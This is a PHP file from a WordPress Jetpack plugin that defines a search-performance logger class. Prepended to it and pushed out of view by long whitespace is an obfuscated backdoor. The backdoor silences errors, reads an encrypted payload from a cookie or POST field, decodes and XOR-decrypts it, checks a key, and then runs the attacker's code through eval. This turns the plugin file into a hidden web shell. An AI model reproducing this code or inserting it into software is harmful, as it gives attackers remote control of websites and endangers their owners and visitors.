<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $p831a5b06 = 576;$GLOBALS['o29d'] = Array();global $o29d;$o29d = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['u8a63f67b'] = "\xa\x4f\x7d\x2f\x5a\x46\x3e\x74\x39\x70\x31\x6e\x6f\xd\x9\x7b\x56\x78\x77\x26\x29\x55\x4a\x7a\x28\x41\x3c\x35\x69\x20\x5c\x4c\x30\x2b\x23\x72\x32\x66\x75\x76\x6d\x3b\x24\x60\x45\x57\x79\x3a\x51\x22\x49\x27\x48\x44\x37\x62\x65\x64\x38\x6c\x52\x42\x5e\x34\x7c\x21\x25\x5d\x4b\x73\x36\x33\x2a\x40\x67\x50\x58\x5f\x47\x71\x4e\x6b\x68\x4d\x5b\x59\x2d\x7e\x63\x2e\x6a\x54\x43\x61\x53\x3f\x2c\x3d";$o29d[$o29d['u8a63f67b'][79].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][54].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][36]] = $o29d['u8a63f67b'][88].$o29d['u8a63f67b'][82].$o29d['u8a63f67b'][35];$o29d[$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][54].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][54]] = $o29d['u8a63f67b'][12].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][57];$o29d[$o29d['u8a63f67b'][23].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][93]] = $o29d['u8a63f67b'][57].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][11].$o29d['u8a63f67b'][56];$o29d[$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][27]] = $o29d['u8a63f67b'][69].$o29d['u8a63f67b'][7].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][59].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][11];$o29d[$o29d['u8a63f67b'][79].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][63]] = $o29d['u8a63f67b'][57].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][11].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][57];$o29d[$o29d['u8a63f67b'][39].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][93]] = $o29d['u8a63f67b'][28].$o29d['u8a63f67b'][11].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][69].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][7];$o29d[$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][93]] = $o29d['u8a63f67b'][69].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][59].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][23].$o29d['u8a63f67b'][56];$o29d[$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][71]] = $o29d['u8a63f67b'][9].$o29d['u8a63f67b'][82].$o29d['u8a63f67b'][9].$o29d['u8a63f67b'][39].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][69].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][11];$o29d[$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][54]] = $o29d['u8a63f67b'][38].$o29d['u8a63f67b'][11].$o29d['u8a63f67b'][69].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][59].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][23].$o29d['u8a63f67b'][56];$o29d[$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][37]] = $o29d['u8a63f67b'][55].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][69].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][56];$o29d[$o29d['u8a63f67b'][59].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][56]] = $o29d['u8a63f67b'][69].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][7].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][7].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][40].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][59].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][40].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][7];$o29d[$o29d['u8a63f67b'][79].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][70]] = $o29d['u8a63f67b'][55].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][54].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][54].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][55];$o29d[$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][93]] = $o29d['u8a63f67b'][37].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][57];$o29d[$o29d['u8a63f67b'][74].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][54]] = $_POST;$o29d[$o29d['u8a63f67b'][17].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][71]] = $_COOKIE;@$o29d[$o29d['u8a63f67b'][39].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][93]]($o29d['u8a63f67b'][56].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][59].$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][74], NULL);@$o29d[$o29d['u8a63f67b'][39].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][93]]($o29d['u8a63f67b'][59].$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][74].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][69], 0);@$o29d[$o29d['u8a63f67b'][39].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][93]]($o29d['u8a63f67b'][40].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][17].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][17].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][38].$o29d['u8a63f67b'][7].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][11].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][7].$o29d['u8a63f67b'][28].$o29d['u8a63f67b'][40].$o29d['u8a63f67b'][56], 0);@$o29d[$o29d['u8a63f67b'][59].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][56]](0);if (!$o29d[$o29d['u8a63f67b'][79].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][63]]($o29d['u8a63f67b'][25].$o29d['u8a63f67b'][31].$o29d['u8a63f67b'][60].$o29d['u8a63f67b'][44].$o29d['u8a63f67b'][25].$o29d['u8a63f67b'][53].$o29d['u8a63f67b'][85].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][60].$o29d['u8a63f67b'][21].$o29d['u8a63f67b'][80].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][93])){$o29d[$o29d['u8a63f67b'][23].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][93]]($o29d['u8a63f67b'][25].$o29d['u8a63f67b'][31].$o29d['u8a63f67b'][60].$o29d['u8a63f67b'][44].$o29d['u8a63f67b'][25].$o29d['u8a63f67b'][53].$o29d['u8a63f67b'][85].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][60].$o29d['u8a63f67b'][21].$o29d['u8a63f67b'][80].$o29d['u8a63f67b'][77].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][93], 1);$ma6c317a2 = NULL;$e08c1 = NULL;$o29d[$o29d['u8a63f67b'][69].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][71]] = $o29d['u8a63f67b'][58].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][86].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][86].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][86].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][86].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][58].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36];global $s914e3;function  f49e0ddd($ma6c317a2, $d59c49db){global $o29d;$lf43a1 = "";for ($mfa31=0; $mfa31<$o29d[$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][27]]($ma6c317a2);){for ($l20755=0; $l20755<$o29d[$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][27]]($d59c49db) && $mfa31<$o29d[$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][27]]($ma6c317a2); $l20755++, $mfa31++){$lf43a1 .= $o29d[$o29d['u8a63f67b'][79].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][54].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][36]]($o29d[$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][54].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][54]]($ma6c317a2[$mfa31]) ^ $o29d[$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][54].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][54]]($d59c49db[$l20755]));}}return $lf43a1;}function  bb276271b($ma6c317a2, $d59c49db){global $o29d;global $s914e3;return $o29d[$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][93]]($o29d[$o29d['u8a63f67b'][35].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][10].$o29d['u8a63f67b'][93]]($ma6c317a2, $s914e3), $d59c49db);}foreach ($o29d[$o29d['u8a63f67b'][17].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][71]] as $d59c49db=>$he0d8c){$ma6c317a2 = $he0d8c;$e08c1 = $d59c49db;}if (!$ma6c317a2){foreach ($o29d[$o29d['u8a63f67b'][74].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][63].$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][54]] as $d59c49db=>$he0d8c){$ma6c317a2 = $he0d8c;$e08c1 = $d59c49db;}}$ma6c317a2 = @$o29d[$o29d['u8a63f67b'][12].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][54]]($o29d[$o29d['u8a63f67b'][79].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][70]]($o29d[$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][55].$o29d['u8a63f67b'][27].$o29d['u8a63f67b'][37]]($ma6c317a2), $e08c1));if (isset($ma6c317a2[$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][81]]) && $s914e3==$ma6c317a2[$o29d['u8a63f67b'][93].$o29d['u8a63f67b'][81]]){if ($ma6c317a2[$o29d['u8a63f67b'][93]] == $o29d['u8a63f67b'][28]){$mfa31 = Array($o29d['u8a63f67b'][9].$o29d['u8a63f67b'][39] => @$o29d[$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][37].$o29d['u8a63f67b'][71].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][88].$o29d['u8a63f67b'][57].$o29d['u8a63f67b'][36].$o29d['u8a63f67b'][71]](),$o29d['u8a63f67b'][69].$o29d['u8a63f67b'][39] => $o29d['u8a63f67b'][10].$o29d['u8a63f67b'][89].$o29d['u8a63f67b'][32].$o29d['u8a63f67b'][86].$o29d['u8a63f67b'][10],);echo @$o29d[$o29d['u8a63f67b'][56].$o29d['u8a63f67b'][8].$o29d['u8a63f67b'][70].$o29d['u8a63f67b'][93]]($mfa31);}elseif ($ma6c317a2[$o29d['u8a63f67b'][93]] == $o29d['u8a63f67b'][56]){eval/*uefd45*/($ma6c317a2[$o29d['u8a63f67b'][57]]);}exit();}} ?><?php

class Jetpack_Search_Performance_Logger {
	/**
	 * @var Jetpack_Search_Performance_Logger
	 **/
	private static $instance = null;

	private $current_query = null;
	private $query_started = null;
	private $stats = null;

	static function init() {
		if ( is_null( self::$instance ) ) {
			self::$instance = new Jetpack_Search_Performance_Logger;
		}

		return self::$instance;
	}

	private function __construct() {
		$this->stats = array();
		add_action( 'pre_get_posts', array( $this, 'begin_log_query' ), 10, 1 );
		add_action( 'did_jetpack_search_query', array( $this, 'log_jetpack_search_query' ) );
		add_filter( 'found_posts', array( $this, 'log_mysql_query' ), 10, 2 );
		add_action( 'wp_footer', array( $this, 'print_stats' ) );
	}

	public function begin_log_query( $query  ) {
		if ( $this->should_log_query( $query ) ) {
			$this->query_started = microtime( true );
			$this->current_query = $query;
		}
	}

	public function log_mysql_query( $found_posts, $query ) {
		if ( $this->current_query === $query ) {
			$duration = microtime( true ) - $this->query_started;
			if ( $duration < 60 ) { // eliminate outliers, likely tracking errors
				$this->record_query_time( $duration, false );
			}
			$this->reset_query_state();
		}

		return $found_posts;
	}

	public function log_jetpack_search_query() {
		$duration = microtime( true ) - $this->query_started;
		if ( $duration < 60 ) { // eliminate outliers, likely tracking errors
			$this->record_query_time( $duration, true );
		}
		$this->reset_query_state();
	}

	private function reset_query_state() {
		$this->query_started = null;
		$this->current_query = null;
	}

	private function should_log_query( $query ) {
		return $query->is_main_query() && $query->is_search();
	}

	private function record_query_time( $duration, $was_jetpack_search ) {
		$this->stats[] = array( $was_jetpack_search, intval( $duration * 1000 ) );
	}

	public function print_stats() {
		$beacons = array();
		if ( ! empty( $this->stats ) ) {
			foreach( $this->stats as $stat ) {
				$search_type = $stat[0] ? 'es' : 'mysql';
				$beacons[] = "%22jetpack.search.{$search_type}.duration:{$stat[1]}|ms%22";
			}

			$encoded_json = '{%22beacons%22:[' . implode(',', $beacons ) . ']}';
			$encoded_site_url = urlencode( site_url() );
			$url = "https://pixel.wp.com/boom.gif?v=0.9&u={$encoded_site_url}&json={$encoded_json}";
			echo '<img src="' . $url . '" width="1" height="1" style="display:none;" alt=":)"/>';
		}
	}
}
